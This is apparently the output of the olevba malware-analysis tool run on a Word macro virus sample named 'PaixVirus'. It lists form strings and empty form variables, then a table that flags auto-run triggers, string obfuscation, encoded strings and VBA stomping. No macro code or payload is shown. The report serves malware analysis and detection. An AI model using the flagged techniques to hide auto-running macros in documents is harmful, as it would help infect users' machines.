VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Merci!!!!�H
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label1'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label2'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label3'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label4'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label5'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'Label6'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
-------------------------------------------------------------------------------
VBA FORM Variable "b'CommandButton1'" IN 'Virus.MSWord.PaixVirus' - OLE stream: 'Macros/PaixMsg2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
None
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |CommandButton1_Click|Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

